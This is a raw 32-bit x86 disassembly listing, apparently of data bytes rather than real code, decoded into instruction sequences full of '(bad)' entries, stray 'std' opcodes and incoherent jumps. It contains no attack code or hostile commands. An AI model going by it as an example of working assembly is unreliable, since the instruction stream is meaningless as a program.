11013475:	jns    0x110134c6
11013477:	jmp    ecx
11013479:	je     0x110134c5
1101347b:	(bad)  
1101347c:	fidiv  WORD PTR [eax+0x47]
1101347f:	(bad)  
11013480:	fsubr  QWORD PTR [ebx+eax*2-0x1]
11013484:	fldcw  WORD PTR [eax+0x3f]
11013487:	call   ebp
11013489:	fs cmp al,0xff
1101348c:	rcr    BYTE PTR [edi+0x39],cl
1101348f:	call   eax
11013491:	pop    esp
11013492:	xor    eax,0x6f8addff
11013497:	(bad)  
11013498:	(bad)  
11013499:	(bad)  
1101349a:	std    
1101349b:	(bad)  
1101349c:	(bad)  
1101349d:	(bad)  
1101349e:	(bad)  
1101349f:	(bad)  
110134a0:	(bad)  
110134a1:	(bad)  
110134a2:	(bad)  
110134a3:	(bad)  
110134a4:	(bad)  
110134a5:	(bad)  
110134a6:	(bad)  
110134a7:	(bad)  
110134a8:	(bad)  
110134a9:	(bad)  
110134aa:	(bad)  
110134ab:	(bad)  
110134ac:	std    
110134ad:	std    
110134ae:	std    
110134af:	(bad)  
110134b0:	fcomp  st(0)
110134b2:	fdivr  st,st(7)
110134b4:	sbb    eax,0xff1d1d
110134b9:	add    BYTE PTR [eax],al
110134bb:	sti    
110134bc:	add    BYTE PTR [eax],al
110134be:	add    BYTE PTR [edi+0x7b000000],bh
110134c4:	add    BYTE PTR [eax],al
110134c6:	add    BYTE PTR [ebx+0x0],al
110134c9:	add    BYTE PTR [eax],al
110134cb:	inc    ecx
110134cc:	add    BYTE PTR [eax],al
110134ce:	add    BYTE PTR [ebp-0xa000000],cl
110134d4:	pop    ds
110134d5:	pop    ds
110134d6:	pop    ds
110134d7:	(bad)  
110134d8:	(bad)  
110134da:	fcos   
110134dc:	(bad)  
110134dd:	(bad)  
110134de:	(bad)  
110134df:	(bad)  
110134e0:	std    
110134e1:	std    
110134e2:	std    
110134e3:	(bad)  
110134e4:	std    
110134e5:	std    
110134e6:	std    
110134e7:	(bad)  
110134e8:	(bad)  
110134e9:	(bad)  
110134ea:	(bad)  
110134eb:	(bad)  
110134ec:	(bad)  
110134ed:	(bad)  
110134ee:	std    
110134ef:	(bad)  
110134f0:	(bad)  
110134f1:	(bad)  
110134f2:	(bad)  
110134f3:	(bad)  
110134f4:	(bad)  
110134f5:	(bad)  
110134f6:	(bad)  
110134f7:	push   esi
110134f9:	mov    eax,ds:0x96f4ff7b
110134fe:	ins    BYTE PTR es:[edi],dx
110134ff:	push   ebp
11013501:	fwait
11013502:	jno    0x11013503
11013504:	cmc    
11013505:	sahf   
11013506:	jbe    0x11013507
11013508:	cmc    
11013509:	lahf   
1101350a:	js     0x1101350b
1101350c:	cmc    
1101350d:	mov    al,ds:0xa0f5ff79
11013512:	jns    0x11013513
11013514:	cmc    
11013515:	lahf   
11013516:	js     0x11013517
11013518:	cmc    
11013519:	popf   
1101351a:	jne    0x1101351b
1101351c:	cmc    
1101351d:	fwait
1101351e:	jb     0x1101351f
11013520:	hlt    
11013521:	cwde   
11013522:	outs   dx,BYTE PTR ds:[esi]
11013523:	push   edx
11013525:	xchg   edx,eax
11013526:	imul   edi,edi,0xff638def
1101352c:	in     al,dx
1101352d:	mov    BYTE PTR [ebp-0x1],bl
11013530:	jmp    0xf8008db7
11013535:	jge    0x1101358a
11013537:	jmp    ebx
11013539:	jns    0x11013589
1101353b:	jmp    ecx
1101353d:	je     0x11013589
1101353f:	(bad)  
11013540:	fidiv  WORD PTR [eax+0x46]
11013543:	(bad)  
11013544:	fld    TBYTE PTR [ebx+eax*2-0x1]
11013548:	fsub   DWORD PTR [edi+0x3f]
1101354b:	call   ebp
1101354d:	arpl   WORD PTR [edi+edi*8],di
11013550:	rcr    BYTE PTR [edi+0x38],cl
11013553:	call   edi
11013555:	jb     0x110135a7
11013557:	(bad)  
11013558:	(bad)  
11013559:	(bad)  
1101355a:	std    
1101355b:	(bad)  
1101355c:	(bad)  
1101355d:	(bad)  
1101355e:	(bad)  
1101355f:	(bad)  
11013560:	(bad)  
11013561:	(bad)  
11013562:	(bad)  
11013563:	(bad)  
11013564:	(bad)  
11013565:	(bad)  
11013566:	(bad)  
11013567:	(bad)  
11013568:	(bad)  
11013569:	(bad)  
1101356a:	(bad)  
1101356b:	(bad)  
1101356c:	std    
1101356d:	std    
1101356e:	std    
1101356f:	(bad)  
11013570:	std    
11013571:	std    
11013572:	std    
11013573:	call   edi
11013575:	xlat   BYTE PTR ds:[ebx]
11013576:	xlat   BYTE PTR ds:[ebx]
11013577:	call   FWORD PTR ds:0xff1d1d
1101357d:	add    BYTE PTR [eax],al
1101357f:	test   BYTE PTR [eax],0x0
11013582:	add    BYTE PTR [esi+0x41000000],cl
11013588:	add    BYTE PTR [eax],al
1101358a:	add    BYTE PTR [eax+eax*1+0x0],dl
1101358e:	add    bh,ch
11013590:	sbb    eax,0xdaff1d1d
11013595:	fcmovu st,st(2)
11013597:	(bad)  
11013598:	std    
11013599:	std    
1101359a:	std    
1101359b:	(bad)  
1101359c:	(bad)  
1101359d:	(bad)  
1101359e:	(bad)  
1101359f:	(bad)  
110135a0:	std    
110135a1:	std    
110135a2:	std    
110135a3:	(bad)  
110135a4:	std    
110135a5:	std    
110135a6:	std    
110135a7:	(bad)  
110135a8:	std    
110135a9:	std    
110135aa:	std    
110135ab:	(bad)  
110135ac:	std    
110135ad:	std    
110135ae:	std    
110135af:	(bad)  
110135b0:	(bad)  
110135b1:	(bad)  
110135b2:	std    
110135b3:	(bad)  
110135b4:	std    
110135b5:	std    
110135b6:	std    
110135b7:	push   ebp
110135b9:	fwait
110135ba:	jb     0x110135bb
110135bc:	cmc    
110135bd:	fwait
110135be:	jb     0x110135bf
110135c0:	cmc    
110135c1:	mov    al,ds:0xa4f6ff79
110135c6:	jg     0x110135c7
110135c8:	mul    BYTE PTR [esi-0x5809007e]
110135ce:	cmp    edi,0xfffffff6
110135d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
110135d2:	cmp    edi,0xfffffff6
110135d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
110135d6:	cmp    edi,0xff7da3f5
110135dc:	cmc    
110135dd:	mov    al,ds:0x9df5ff79
110135e2:	jne    0x110135e3
110135e4:	hlt    
110135e5:	cdq    
110135e6:	jo     0x110135e7
110135e8:	repnz xchg ebx,eax
110135ea:	imul   edi,edi,0xff628def
110135f0:	jmp    0x11013579
110135f2:	pop    esp
110135f3:	(bad)  
110135f4:	call   0xf8008d7a
110135f9:	jge    0x1101364d
110135fb:	jmp    ebx
110135fd:	js     0x1101364d
110135ff:	jmp    ecx
11013601:	jae    0x1101364c
11013603:	(bad)  
11013604:	fisubr WORD PTR [edi+0x46]
11013607:	(bad)  
11013608:	fld    TBYTE PTR [ebx+0x42]
1101360b:	call   edi
1101360d:	addr16 notrack call ebp
11013611:	arpl   WORD PTR [ebx],di
11013613:	call   ebp
11013615:	addr16 inc ecx
11013617:	(bad)  
11013618:	std    
11013619:	std    
1101361a:	std    
1101361b:	(bad)  
1101361c:	(bad)  
1101361d:	(bad)  
1101361e:	std    
1101361f:	(bad)  
11013620:	(bad)  
11013621:	(bad)  
11013622:	std    
11013623:	(bad)  
11013624:	std    
11013625:	std    
11013626:	std    
11013627:	(bad)  
11013628:	std    
11013629:	std    
1101362a:	std    
1101362b:	(bad)  
1101362c:	std    
1101362d:	std    
1101362e:	std    
1101362f:	(bad)  
11013630:	std    
11013631:	std    
11013632:	std    
11013633:	(bad)  
11013634:	std    
11013635:	std    
11013636:	std    
11013637:	(bad)  
11013638:	fcomp  st(0)
1101363a:	fdivr  st,st(7)
1101363c:	sbb    al,0x1c
1101363e:	sbb    al,0xff
11013640:	add    BYTE PTR [eax],al
11013642:	add    bh,ch
11013644:	add    BYTE PTR [eax],al
11013646:	add    BYTE PTR [eax+eax*1+0x0],dl
1101364a:	add    BYTE PTR [ebx+0x0],al
1101364d:	add    BYTE PTR [eax],al
1101364f:	jmp    0x1101366f
11013651:	push   ds
11013652:	push   ds
11013653:	(bad)  
11013654:	fcmovnu st,st(3)
11013656:	(bad)  
11013658:	(bad)  
11013659:	(bad)  
1101365a:	(bad)  
1101365b:	(bad)  
1101365c:	(bad)  
1101365d:	(bad)  
1101365e:	(bad)  
1101365f:	(bad)  
11013660:	(bad)  
11013661:	(bad)  
11013662:	(bad)  
11013663:	(bad)  
11013664:	(bad)  
11013665:	(bad)  
11013666:	std    
11013667:	(bad)  
11013668:	(bad)  
11013669:	(bad)  
1101366a:	(bad)  
1101366b:	(bad)  
1101366c:	(bad)  
1101366d:	(bad)  
1101366e:	(bad)  
1101366f:	(bad)  
11013670:	(bad)  
11013671:	(bad)  
11013672:	(bad)  
11013673:	(bad)  
11013674:	(bad)  
11013675:	(bad)  
11013676:	std    
11013677:	push   esi
11013679:	sahf   
1101367a:	ja     0x1101367b
1101367c:	cmc    
1101367d:	mov    al,ds:0xa7f6ff79
11013682:	cmp    edi,0xfffffff7
11013685:	lods   al,BYTE PTR ds:[esi]
11013686:	mov    bh,bh
11013688:	imul   DWORD PTR [edi-0x4f080072]
1101368e:	nop
1101368f:	push   edi
11013691:	mov    al,0x90
11013693:	push   edi
11013695:	scas   al,BYTE PTR es:[edi]
11013696:	mov    edi,?
11013698:	imul   BYTE PTR [edx-0x58090078]
1101369e:	cmp    bh,0xf6
110136a1:	mov    ds:0x9ef5ff7c,al
110136a6:	jbe    0x110136a7
110136a8:	hlt    
110136a9:	cdq    
110136aa:	jo     0x110136ab
110136ac:	repnz xchg edx,eax
110136ae:	push   0x618ceeff
110136b3:	(bad)  
110136b4:	jmp    0x1101363d
110136b6:	pop    esp
110136b7:	(bad)  
110136b8:	jmp    0xf8008d3e
110136bd:	jl     0x11013711
110136bf:	jmp    esp
110136c1:	js     0x11013710
110136c3:	jmp    ecx
110136c5:	jae    0x11013710
110136c7:	(bad)  
110136c8:	fisubr WORD PTR [edi+0x46]
110136cb:	(bad)  
110136cc:	fisubr DWORD PTR [ebx+0x41]
110136cf:	(bad)  
110136d0:	fsub   DWORD PTR [esi+0x3e]
110136d3:	(bad)  
110136d4:	fsubr  DWORD PTR [ebx+0x44]
110136d7:	(bad)  
110136d8:	(bad)  
110136d9:	(bad)  
110136da:	std    
110136db:	(bad)  
110136dc:	(bad)  
110136dd:	(bad)  
110136de:	std    
110136df:	(bad)  
110136e0:	(bad)  
110136e1:	(bad)  
110136e2:	std    
110136e3:	(bad)  
110136e4:	(bad)  
110136e5:	(bad)  
110136e6:	(bad)  
110136e7:	(bad)  
110136e8:	(bad)  
110136e9:	(bad)  
110136ea:	(bad)  
110136eb:	(bad)  
110136ec:	std    
110136ed:	std    
110136ee:	std    
110136ef:	(bad)  
110136f0:	(bad)  
110136f1:	(bad)  
110136f2:	(bad)  
110136f3:	(bad)  
110136f4:	std    
110136f5:	std    
110136f6:	std    
110136f7:	(bad)  
110136f8:	fcmovu st,st(2)
110136fa:	(bad)  
110136fc:	sbb    eax,0xfe1d1d
11013701:	add    BYTE PTR [eax],al
11013703:	jmp    0x0:0x41000000
1101370a:	add    BYTE PTR [eax+eax*1],cl
1101370d:	add    BYTE PTR [eax],al
1101370f:	inc    esi
11013710:	add    BYTE PTR [eax],al
11013712:	add    bl,ch
11013714:	and    BYTE PTR [eax],ah
11013716:	and    dh,bh
11013718:	fcmovu st,st(2)
1101371a:	(bad)  
1101371c:	(bad)  
1101371d:	(bad)  
1101371e:	(bad)  
1101371f:	(bad)  
11013720:	std    
11013721:	std    
11013722:	std    
11013723:	(bad)  
11013724:	std    
11013725:	std    
11013726:	std    
11013727:	(bad)  
11013728:	(bad)  
11013729:	(bad)  
1101372a:	std    
1101372b:	(bad)  
1101372c:	(bad)  
1101372d:	(bad)  
1101372e:	std    
1101372f:	(bad)  
11013730:	(bad)  
11013731:	(bad)  
11013732:	(bad)  
11013733:	(bad)  
11013734:	std    
11013735:	std    
11013736:	std    
11013737:	push   edi
11013739:	stos   BYTE PTR es:[edi],al
1101373a:	mov    bh,bh
1101373c:	mul    BYTE PTR [ebp-0x5108007f]
11013742:	(bad)  
11013743:	(bad)  
11013744:	clc    
11013745:	mov    ch,0x97
11013747:	(bad)  
11013748:	clc    
11013749:	mov    eax,0xbaf8ff9c
1101374e:	sahf   
1101374f:	(bad)  
11013750:	clc    
11013751:	mov    edx,0xb7f8ff9d
11013756:	cdq    
11013757:	push   edi
11013759:	mov    dl,0x93
1101375b:	push   edi
1101375d:	lods   eax,DWORD PTR ds:[esi]
1101375e:	mov    edi,?
11013760:	mul    BYTE PTR [edi-0x5d0a007c]
11013766:	jl     0x11013767
11013768:	cmc    
11013769:	popf   
1101376a:	jne    0x1101376b
1101376c:	hlt    
1101376d:	xchg   edi,eax
1101376e:	outs   dx,BYTE PTR ds:[esi]
1101376f:	push   ecx
11013771:	xchg   ecx,eax
11013772:	data16 (bad) 
11013774:	out    dx,al
11013775:	mov    esp,DWORD PTR [eax-0x1]
11013778:	jmp    0x110136ff
1101377a:	pop    edx
1101377b:	(bad)  
1101377c:	jmp    0xf8008d01
11013781:	jnp    0x110137d3
11013783:	jmp    esp
11013785:	ja     0x110137d3
11013787:	jmp    ecx
11013789:	jb     0x110137d3
1101378b:	(bad)  
1101378c:	(bad)  [esi+0x44]
1101378f:	(bad)  
11013790:	fisubr DWORD PTR [edx+0x40]
11013793:	(bad)  
11013794:	fidivr WORD PTR [ebx+0x57]
11013797:	(bad)  
11013798:	std    
11013799:	std    
1101379a:	std    
1101379b:	(bad)  
1101379c:	(bad)  
1101379d:	(bad)  
1101379e:	std    
1101379f:	(bad)  
110137a0:	(bad)  
110137a1:	(bad)  
110137a2:	std    
110137a3:	(bad)  
110137a4:	(bad)  
110137a5:	(bad)  
110137a6:	std    
110137a7:	(bad)  
110137a8:	(bad)  
110137a9:	(bad)  
110137aa:	std    
110137ab:	(bad)  
110137ac:	std    
110137ad:	std    
110137ae:	std    
110137af:	(bad)  
110137b0:	std    
110137b1:	std    
110137b2:	std    
110137b3:	(bad)  
110137b4:	(bad)  
110137b6:	fcos   
110137b8:	pop    ds
110137b9:	pop    ds
110137ba:	pop    ds
110137bb:	inc    BYTE PTR [eax]
110137bd:	add    BYTE PTR [eax],al
110137bf:	jmp    0x110137c1
110137c1:	add    BYTE PTR [eax],al
110137c3:	dec    eax
110137c4:	add    BYTE PTR [eax],al
110137c6:	add    BYTE PTR [eax+eax*1],cl
110137c9:	add    BYTE PTR [eax],al
110137cb:	add    eax,DWORD PTR [eax]
110137cd:	add    BYTE PTR [eax],al
110137cf:	or     al,0x0
110137d1:	add    BYTE PTR [eax],al
110137d3:	inc    ebp
110137d4:	add    BYTE PTR [eax],al
110137d6:	add    ch,ch
110137d8:	and    BYTE PTR [eax],ah
110137da:	and    dh,bh
110137dc:	fcmovnu st,st(3)
110137de:	(bad)  
110137e0:	std    
110137e1:	std    
110137e2:	std    
110137e3:	(bad)  
110137e4:	std    
110137e5:	std    
110137e6:	std    
110137e7:	(bad)  
110137e8:	(bad)  
110137e9:	(bad)  
110137ea:	std    
110137eb:	(bad)  
110137ec:	(bad)  
110137ed:	(bad)  
110137ee:	std    
110137ef:	(bad)  
110137f0:	(bad)  
110137f1:	(bad)  
110137f2:	std    
110137f3:	(bad)  
110137f4:	(bad)  
110137f5:	(bad)  
110137f6:	std    
110137f7:	(bad)  
110137f8:	clc    
110137f9:	mov    ebp,0xaaf6ffa2
110137fe:	mov    bh,bh
11013800:	div    DWORD PTR [ebp-0x41070069]
11013806:	mov    ds:0xaac2f8ff,eax
1101380b:	(bad)  
1101380c:	stc    
1101380d:	les    ebp,FWORD PTR [ebp-0x543b0601]
11013813:	(bad)  
11013814:	clc    
11013815:	shl    BYTE PTR [edi-0x60440701],0xff
1101381c:	div    DWORD PTR [esi+edx*4-0x73520801]
11013823:	push   esi
11013825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
11013826:	cmp    bh,0xf5
11013829:	mov    al,ds:0x9bf5ff79
1101382e:	jb     0x1101382f
11013830:	repz xchg ebp,eax
11013832:	imul   edi,edi,0xfffffff0
11013835:	(bad)  
11013836:	fs (bad) 
11013838:	out    dx,al
11013839:	mov    DWORD PTR [esi-0x1],ebx
1101383c:	jmp    0x110137c2
1101383e:	pop    eax
1101383f:	(bad)  
11013840:	jmp    0xf8008bc4
11013845:	jnp    0x11013896
11013847:	jmp    ebx
11013849:	jbe    0x11013896
1101384b:	(bad)  
1101384c:	fbstp  TBYTE PTR [ecx+0x46]
1101384f:	(bad)  
11013850:	(bad)  [ebp+0x43]
11013853:	jmp    esi
11013855:	xchg   esi,eax
11013856:	jns    0x11013857
11013858:	(bad)  
11013859:	(bad)  
1101385a:	std    
1101385b:	(bad)  
1101385c:	(bad)  
1101385d:	(bad)  
1101385e:	std    
1101385f:	(bad)  
11013860:	(bad)  
11013861:	(bad)  
11013862:	std    
11013863:	(bad)  
11013864:	(bad)  
11013865:	(bad)  
11013866:	std    
11013867:	(bad)  
11013868:	(bad)  
11013869:	(bad)  
1101386a:	std    
1101386b:	(bad)  
1101386c:	std    
1101386d:	std    
1101386e:	std    
1101386f:	(bad)  
11013870:	(bad)  
11013872:	fcos   
11013874:	pop    ds
11013875:	pop    ds
11013876:	pop    ds
11013877:	inc    DWORD PTR [eax]
11013879:	add    BYTE PTR [eax],al
1101387b:	out    dx,eax
1101387c:	add    BYTE PTR [eax],al
1101387e:	add    BYTE PTR [eax+eax*1+0x0],dl
11013882:	add    BYTE PTR [edx],dl
11013884:	add    BYTE PTR [eax],al
11013886:	add    BYTE PTR [eax+eax*1],al
11013889:	add    BYTE PTR [eax],al
1101388b:	add    BYTE PTR [eax],al
1101388d:	add    BYTE PTR [eax],al
1101388f:	add    eax,DWORD PTR [eax]
11013891:	add    BYTE PTR [eax],al
11013893:	or     al,0x0
11013895:	add    BYTE PTR [eax],al
11013897:	inc    ebp
11013898:	add    BYTE PTR [eax],al
1101389a:	add    bl,ch
1101389c:	push   ds
1101389d:	push   ds
1101389e:	push   ds
1101389f:	(bad)  
110138a0:	fcmovnu st,st(3)
110138a2:	(bad)  
110138a4:	(bad)  
110138a5:	(bad)  
110138a6:	(bad)  
110138a7:	(bad)  
110138a8:	(bad)  
110138a9:	(bad)  
110138aa:	(bad)  
110138ab:	(bad)  
110138ac:	(bad)  
110138ad:	(bad)  
110138ae:	(bad)  
110138af:	(bad)  
110138b0:	(bad)  
110138b1:	(bad)  
110138b2:	(bad)  
110138b3:	(bad)  
110138b4:	(bad)  
110138b5:	(bad)  
110138b6:	std    
110138b7:	(bad)  
110138b8:	sti    
110138b9:	xlat   BYTE PTR ds:[ebx]
110138ba:	(bad)  
110138bb:	push   edi
110138bd:	scas   eax,DWORD PTR es:[edi]
110138be:	mov    ?,edi
110138c0:	clc    
110138c1:	mov    esp,0xc6f9ffa0
110138c6:	scas   eax,DWORD PTR es:[edi]
110138c7:	(bad)  
110138c8:	stc    
110138c9:	int3   
110138ca:	mov    eax,0xbbcffaff
110138cf:	(bad)  
110138d0:	stc    
110138d1:	int    0xb9
110138d3:	(bad)  
110138d4:	stc    
110138d5:	leave  
110138d6:	mov    bl,0xff
110138d8:	clc    
110138d9:	ret    
110138da:	stos   DWORD PTR es:[edi],eax
110138db:	(bad)  
110138dc:	clc    
110138dd:	mov    ebx,0xb3f7ffa0
110138e2:	xchg   esp,eax
110138e3:	push   esi
110138e5:	stos   BYTE PTR es:[edi],al
110138e6:	mov    bh,bh
110138e8:	mul    BYTE PTR [ebx-0x620a0082]
110138ee:	jne    0x110138ef
110138f0:	hlt    
110138f1:	cwde   
110138f2:	outs   dx,BYTE PTR ds:[esi]
110138f3:	push   ebx
110138f5:	xchg   ebx,eax
110138f6:	push   0x628df0ff
110138fb:	(bad)  
110138fc:	out    dx,al
110138fd:	mov    BYTE PTR [edi+edi*8-0x15],bl
11013901:	adc    DWORD PTR [edi-0x1],0xffffffe9
11013905:	jle    0x11013959
11013907:	jmp    ebp
11013909:	jns    0x11013959
1101390b:	jmp    edx
1101390d:	jne    0x11013958
1101390f:	jmp    eax
11013911:	jno    0x11013959
11013913:	push   ecx
11013915:	mov    edi,0xfefeffab
1101391a:	std    
1101391b:	(bad)  
1101391c:	(bad)  
1101391d:	(bad)  
1101391e:	std    
1101391f:	(bad)  
11013920:	(bad)  
11013921:	(bad)  
11013922:	std    
11013923:	(bad)  
11013924:	(bad)  
11013925:	(bad)  
11013926:	(bad)  
11013927:	(bad)  
11013928:	(bad)  
11013929:	(bad)  
1101392a:	(bad)  
1101392b:	(bad)  
1101392c:	fcmovu st,st(2)
1101392e:	(bad)  
11013930:	sbb    eax,0xff1d1d
11013935:	add    BYTE PTR [eax],al
11013937:	repz add BYTE PTR [eax],al
1101393a:	add    BYTE PTR [ecx+0x0],dh
1101393d:	add    BYTE PTR [eax],al
1101393f:	and    eax,DWORD PTR [eax]
11013941:	add    BYTE PTR [eax],al
11013943:	or     DWORD PTR [eax],eax
11013945:	add    BYTE PTR [eax],al
11013947:	add    DWORD PTR [eax],eax
	...
11013951:	add    BYTE PTR [eax],al
11013953:	add    eax,DWORD PTR [eax]
11013955:	add    BYTE PTR [eax],al
11013957:	or     eax,0x49000000
1101395c:	add    BYTE PTR [eax],al
1101395e:	add    ah,ch
11013960:	and    BYTE PTR [eax],ah
11013962:	and    bh,bh
11013964:	fcmovu st,st(2)
11013966:	(bad)  
11013968:	(bad)  
11013969:	(bad)  
1101396a:	std    
1101396b:	(bad)  
1101396c:	(bad)  
1101396d:	(bad)  
1101396e:	std    
1101396f:	(bad)  
11013970:	(bad)  
11013971:	(bad)  
11013972:	std    
11013973:	(bad)  
11013974:	(bad)  
11013975:	(bad)  
11013976:	std    
11013977:	(bad)  
11013978:	std    
11013979:	hlt    
1101397a:	lock (bad) 
1101397c:	clc    
1101397d:	mov    ah,0x96
1101397f:	(bad)  
11013980:	clc    
11013981:	shl    BYTE PTR [esi-0x47330601],0xff
11013988:	cli    
11013989:	aam    0xc3
1101398b:	(bad)  
1101398c:	cli    
1101398d:	xlat   BYTE PTR ds:[ebx]
1101398e:	(bad)  
1101398f:	(bad)  
11013990:	cli    
11013991:	(bad)  
11013992:	(bad)  
11013995:	sar    DWORD PTR [esi-0x4b360601],1
1101399b:	(bad)  
1101399c:	clc    
1101399d:	shl    BYTE PTR [edi-0x65480701],0xff
110139a4:	imul   DWORD PTR [esi-0x59090073]
110139aa:	cmp    edi,0xff789ff5
110139b0:	cmc    
110139b1:	cdq    
110139b2:	jo     0x110139b3
110139b4:	hlt    
110139b5:	xchg   ebp,eax
110139b6:	push   0xffffffff
110139b8:	repz xchg ecx,eax
110139ba:	gs push ecx
110139bd:	mov    WORD PTR [edi-0x1],ds
110139c0:	out    dx,al
110139c1:	xchg   DWORD PTR [edx-0x1],ebx
110139c4:	jmp    0x11013948
110139c6:	push   ebp
110139c7:	(bad)  
110139c8:	call   0xf7008a4a
110139cd:	js     0x11013a1b
110139cf:	jmp    esp
110139d1:	js     0x11013a21
110139d3:	(bad)  
110139d4:	sti    
110139d5:	in     eax,dx
110139d6:	call   0xeff37da
110139db:	(bad)  
110139dc:	(bad)  
110139dd:	(bad)  
110139de:	std    
110139df:	(bad)  
110139e0:	(bad)  
110139e1:	(bad)  
110139e2:	(bad)  
110139e3:	(bad)  
110139e4:	(bad)  
110139e5:	(bad)  
110139e6:	std    
110139e7:	(bad)  
110139e8:	(bad)  
110139ea:	fcos   
110139ec:	pop    ds
110139ed:	pop    ds
110139ee:	pop    ds
110139ef:	inc    DWORD PTR [eax]
110139f1:	add    BYTE PTR [eax],al
110139f3:	clc    
110139f4:	add    BYTE PTR [eax],al
110139f6:	add    BYTE PTR [esi+0x4a000000],bl
110139fc:	add    BYTE PTR [eax],al
110139fe:	add    BYTE PTR [ebx],bl
11013a00:	add    BYTE PTR [eax],al
11013a02:	add    BYTE PTR [esi],al
	...
11013a14:	add    BYTE PTR [eax],al
11013a16:	add    BYTE PTR [eax+eax*1],al
11013a19:	add    BYTE PTR [eax],al
11013a1b:	adc    al,BYTE PTR [eax]
11013a1d:	add    BYTE PTR [eax],al
11013a1f:	push   ebp
11013a20:	add    BYTE PTR [eax],al
11013a22:	add    bh,bh
11013a24:	and    BYTE PTR [eax],ah
11013a26:	and    bh,bh
11013a28:	fcmovnu st,st(3)
11013a2a:	(bad)  
11013a2c:	(bad)  
11013a2d:	(bad)  
11013a2e:	std    
11013a2f:	(bad)  
11013a30:	(bad)  
11013a31:	(bad)  
11013a32:	std    
11013a33:	(bad)  
11013a34:	std    
11013a35:	std    
11013a36:	std    
11013a37:	(bad)  
11013a38:	(bad)  
11013a39:	(bad)  
11013a3a:	std    
11013a3b:	(bad)  
11013a3c:	cli    
11013a3d:	sar    BYTE PTR [ebp-0x583f0701],1
11013a43:	(bad)  
11013a44:	cli    
11013a45:	into   
11013a46:	mov    ebx,0xc9d8faff
11013a4b:	(bad)  
11013a4c:	sti    
11013a4d:	fmul   st(7),st
11013a4f:	(bad)  
11013a50:	sti    
11013a51:	fcmovne st,st(5)
11013a53:	(bad)  
11013a54:	cli    
11013a55:	(bad)  
11013a56:	(bad)  
11013a59:	int    0xb9
11013a5b:	(bad)  
11013a5c:	stc    
11013a5d:	les    ebp,FWORD PTR [edi+edi*8-0x614508]
11013a64:	div    DWORD PTR [eax-0x58080070]
11013a6a:	cmp    edi,0xfffffff6
11013a6d:	mov    al,ds:0x9af5ff79
11013a72:	jno    0x11013a73
11013a74:	cmc    
11013a75:	xchg   esi,eax
11013a76:	imul   edi,edi,0xfffffff4
11013a79:	xchg   ebx,eax
11013a7a:	push   sp
11013a7d:	(bad)  
11013a7e:	(bad)  
11013a7f:	push   ecx
11013a81:	mov    bl,BYTE PTR [ebp-0x1]
11013a84:	out    dx,al
11013a85:	test   DWORD PTR [eax-0x1],ebx
11013a88:	jmp    0x11013a0a
11013a8a:	push   ebx
11013a8b:	(bad)  
11013a8c:	call   0x1008a0d
11013a91:	stos   BYTE PTR es:[edi],al
11013a92:	(bad)  
11013a93:	(bad)  
11013a94:	(bad)  
11013a95:	(bad)  
11013a96:	std    
11013a97:	(bad)  
11013a98:	std    
11013a99:	std    
11013a9a:	std    
11013a9b:	(bad)  
11013a9c:	std    
11013a9d:	std    
11013a9e:	std    
11013a9f:	(bad)  
11013aa0:	(bad)  
11013aa1:	(bad)  
11013aa2:	(bad)  
11013aa3:	(bad)  
11013aa4:	fcmovu st,st(2)
11013aa6:	(bad)  
11013aa8:	pop    ds
11013aa9:	pop    ds
11013aaa:	pop    ds
11013aab:	inc    DWORD PTR [eax]
11013aad:	add    BYTE PTR [eax],al
11013aaf:	inc    DWORD PTR [eax]
11013ab1:	add    BYTE PTR [eax],al
11013ab3:	int3   
11013ab4:	add    BYTE PTR [eax],al
11013ab6:	add    BYTE PTR [ebp+0x44000000],al
11013abc:	add    BYTE PTR [eax],al
11013abe:	add    BYTE PTR [eax],bl
11013ac0:	add    BYTE PTR [eax],al
11013ac2:	add    BYTE PTR [esi],al
	...
11013ad4:	add    BYTE PTR [eax],al
11013ad6:	add    BYTE PTR [ecx],al
11013ad8:	add    BYTE PTR [eax],al
11013ada:	add    BYTE PTR [ecx],cl
11013adc:	add    BYTE PTR [eax],al
11013ade:	add    BYTE PTR [ebx],ah
11013ae0:	add    BYTE PTR [eax],al
11013ae2:	add    bh,bh
11013ae4:	add    BYTE PTR [eax],al
11013ae6:	add    bh,bh
11013ae8:	push   ds
11013ae9:	push   ds
11013aea:	push   ds
11013aeb:	(bad)  
11013aec:	fcmovnu st,st(3)
11013aee:	(bad)  
11013af0:	(bad)  
11013af1:	(bad)  
11013af2:	(bad)  
11013af3:	(bad)  
11013af4:	(bad)  
11013af5:	(bad)  
11013af6:	std    
11013af7:	(bad)  
11013af8:	(bad)  
11013af9:	(bad)  
11013afa:	(bad)  
11013afb:	(bad)  
11013afc:	std    
11013afd:	div    dl
11013aff:	(bad)  
11013b00:	stc    
11013b01:	ret    
11013b02:	stos   BYTE PTR es:[edi],al
11013b03:	(bad)  
11013b04:	stc    
11013b05:	retf   
11013b06:	mov    bh,0xff
11013b08:	cli    
11013b09:	xlat   BYTE PTR ds:[ebx]
11013b0a:	(bad)  
11013b0b:	(bad)  
11013b0c:	sti    
11013b0d:	(bad)  
11013b0f:	(bad)  
11013b10:	sti    
11013b11:	fmul   st(7),st
11013b13:	(bad)  
11013b14:	cli    
11013b15:	xlat   BYTE PTR ds:[ebx]
11013b16:	(bad)  
11013b17:	(bad)  
11013b18:	cli    
11013b19:	iret   
11013b1a:	mov    ebx,0xadc5f9ff
11013b1f:	(bad)  
11013b20:	clc    
11013b21:	mov    edx,0xb0f7ff9e
11013b26:	nop
11013b27:	push   edi
11013b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11013b2a:	test   bh,bh
11013b2c:	cmc    
11013b2d:	mov    al,ds:0x9af5ff79
11013b32:	jno    0x11013b33
11013b34:	hlt    
11013b35:	xchg   ebp,eax
11013b36:	imul   edi,edi,0xfffffff4
11013b39:	xchg   edx,eax
11013b3a:	push   sp
11013b3d:	nop
11013b3e:	arpl   di,di
11013b40:	repz lea ebx,[edi-0x1]
11013b44:	lock mov BYTE PTR [edx-0x1],bl
11013b48:	in     eax,dx
11013b49:	adc    DWORD PTR [ebp-0x1],0xffffffec
11013b4d:	mov    BYTE PTR [ebp-0x1],bl
11013b50:	cld    
11013b51:	out    dx,eax
11013b52:	jmp    0xfeff:0xfefefeff
11013b59:	(bad)  
11013b5a:	std    
11013b5b:	(bad)  
11013b5c:	(bad)  
11013b5d:	(bad)  
11013b5e:	std    
11013b5f:	(bad)  
11013b60:	fcmovu st,st(2)
11013b62:	(bad)  
11013b64:	sbb    eax,0xff1d1d
